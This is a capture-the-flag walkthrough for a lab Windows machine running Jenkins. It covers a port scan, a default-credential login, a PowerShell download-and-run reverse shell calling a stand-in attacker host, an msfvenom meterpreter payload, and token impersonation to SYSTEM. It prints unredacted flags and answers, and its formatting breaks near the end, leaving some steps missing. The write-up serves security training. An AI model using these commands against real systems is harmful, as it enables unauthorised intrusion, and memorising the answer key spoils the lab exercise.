Hey reader!

Before you proceed, I just wanted to say that, if you're a begineer DO NOT USE THIS WRITEUP AS AN EASY WAY OUT. Try going back to the previous training/info rooms and review those, then give the room a try. I've included the answers and the flags are _not redacted_. But that does not mean that you should just copy-paste them and call it a day. Only use this iff you're truly stumped and stuck. 

With this said, I hope this is useful :smile:

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using openvpn to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Performing a quick `nmap` scan gives us some useful details:
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> How many ports are open? (TCP only)
>
> Answer: 3

OS Fingerprinting for finding a proper attack vector:
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

We can be confident that the server is running some kind of windows OS. There's a http server running on port 80 and a proxy running on port 8080. Visiting the port 80 site, we see:
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

Visiting the page on port 8080, we're greeted with the following:
![Port 8080 page](/assets/img/writeup_assets/alfred/port-8080-login.png)

The web page is a login portal, we can use `hydra` or the burpsuite intruder to bruteforce this and get credentials.

I'll be using burpsuite to launch a sniper attack to get credentials...
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



We can try to log into the portal using the credentials thus obtained.

> Answer: `admin:admin`


## Gaining Access

Once logged into the portal we see a dashboard that allows the user to do all sorts of things.
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

The `New Item` tool on the dashboard can then be used to upload a payload that will be executed in order to provide a reverse shell access. To do this, we'll first need a reverse TCP shell that uses powershell. As the room instructs in it's first task, we're to use `nishang` for this powershell script. 

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Once we have the shell, we can use the `NewItem` tool to upload the file and make the server execute the following commnad:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

Once the project is created, we're redirected to the configuration section where we can specify to the workflow to execute the command mentioned before:

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

Before proceeding, we'll need to start a http server on our machine so that the remote server can connect and get the powershell script. 
***NOTE***: The script file must be in the current working directory for this to work.

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

We will also need to start a listener for the reverse shell:
```shell-session
$ nc -nvlp 4445
```

Now that all this is done, we can finally execute the workflow by clicking on the `Build Now` option shown on the left of the project menu. Doing this will give us a shell to work with:
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

We've successfully obtained the user flag, now we can move onto escalating our privileges. 

> What is the user.txt flag? 
>
> Answer: `79007a09481963edf2e1321abd9ae2a0`

## Privilege Escalation

To make it easier for us to handle, we'll use a meterpreter shell for the escalation section. First, we'll need to generate a payload for a reverse shell:
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
We'll need a listener on our machine:
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


Uploading it to the machine by adding a build step on the configuration of the project:
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

Building the project will grant us the former shell, where we can execute the following command:
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

This will spawn the meterpreter shell.


> What is the final size of the exe payload that you generated?
>
> Answer: `73802`

Now that we have a nice meterpreter shell, we can try and see what privileges we have:
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv

As the user `alfred`, we have the `SeDebugPrivilege`, `SeImpersonatePrivilege` and `SeCreateGlobalPrivilege` privileges enabled. Loading the `incognito` module, we can then use it to list tokens:

```shell-session

Since the `BUILTIN\Administrators` token is available, we can use the following command to impersonate the admin token:
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Running the `getuid` command, we can confirm that we have admin privileges:
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> What is the output when you run the getuid command?
>
> Answer: `NT AUTHORITY\SYSTEM`

As the task advises us to do, we'll now migrate this process:
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668

[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt"
